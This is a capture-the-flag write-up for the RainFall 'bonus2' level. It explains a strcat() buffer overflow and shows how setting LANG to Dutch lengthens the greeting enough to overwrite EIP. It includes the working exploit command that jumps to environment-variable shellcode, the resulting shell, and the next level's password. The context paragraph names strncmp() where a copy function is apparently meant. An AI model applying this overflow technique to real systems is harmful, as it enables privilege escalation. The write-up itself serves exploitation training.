## Context

The program has a main() function and a greetuser() function, and expects two parameters. Using the strncmp() function, up to 40 bytes of the first parameter are copied into a buffer, then up to 32 bytes of the second parameter are copied into the same buffer with an offset of 40 bytes. A global variable `language` is then defined according to the environment variable LANG (1 if LANG = "fi", 2 if LANG = "nl").

The greetuser() function is then called, with the buffer as parameter, which has a maximum size of 72 bytes.

A greeting message in the language specified by the global variable `language` is copied into an other buffer of 72 bytes, then the parameter is concatenated to this second buffer with the strcat() function. The content of this second buffer is finally displayed using the puts() function.

## Lead

As for the bonus0, we can enter a first parameter of size equal to or greater than 40, so that the string is not null-terminated. So, by giving a second parameter big enough, we can manage to generate a segmentation fault in the greeting() function. We can try to overwrite the address pointed by EIP.

## Exploit

If we do not modify the environment variable LANG, the greeting message will be "Hello ". We notice that even with the maximum size of the buffer (40 + 32 bytes), we cannot overwrite EIP. So we will have to modify the environment variable LANG in order to have a longer greeting message and thus hope to reach EIP.
```
bonus2@RainFall:~$ export LANG="nl"
```
The greeting is then "Goedemiddag! ". In this way we can overwrite the value of EIP by filling in 40 + 27 bytes. We can now reuse the shellcode environment variable that we defined in bonus0 (at address 0xbffffeca):
```
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\xca\xfe\xff\xbf"')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB����
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
We can now reach to the next level with the command `su bonus3` and fill in the flag found as a password.